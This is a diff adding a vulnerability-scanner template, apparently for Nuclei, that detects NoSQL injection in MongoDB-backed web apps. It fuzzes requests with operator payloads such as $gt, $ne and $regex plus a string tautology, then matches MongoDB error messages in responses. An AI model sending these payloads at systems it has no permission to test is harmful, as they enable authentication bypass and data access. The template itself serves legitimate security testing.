@@ -1,0 +1,70 @@
+id: nosqli-error-based
+
+info:
+  name: NoSQL Injection - Error Based Detection
+  author: erebos
+  severity: high
+  description: |
+    Detects NoSQL injection vulnerabilities by injecting MongoDB-style operators
+    and observing error responses or authentication bypasses. Common in Node.js
+    applications using MongoDB/Mongoose without proper input validation.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+    - https://book.hacktricks.xyz/pentesting-web/nosql-injection
+  metadata:
+    max-request: 6
+  tags: nosql,mongodb,injection,dast,vuln
+  classification:
+    cwe-id: CWE-943
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    payloads:
+      nosql_operators:
+        - "{\"$gt\":\"\"}"
+        - "{\"$ne\":null}"
+        - "{\"$regex\":\".*\"}"
+        - "[$gt]="
+        - "[$ne]=x"
+        - "' || '1'=='1"
+
+    fuzzing:
+      - part: request
+        type: replace
+        mode: single
+        fuzz:
+          - "{{nosql_operators}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "MongoError"
+          - "MongoDB"
+          - "mongo"
+          - "CastError"
+          - "ObjectId"
+          - "BSONTypeError"
+          - "ValidationError"
+          - "$where"
+          - "MongooseError"
+          - "bson"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)cast to objectid failed"
+          - "(?i)unterminated string literal"
+          - "(?i)invalid operator"
+          - "(?i)\\$where.*not allowed"
+          - "(?i)cannot apply.*to type"
+          - "(?i)failed to parse"
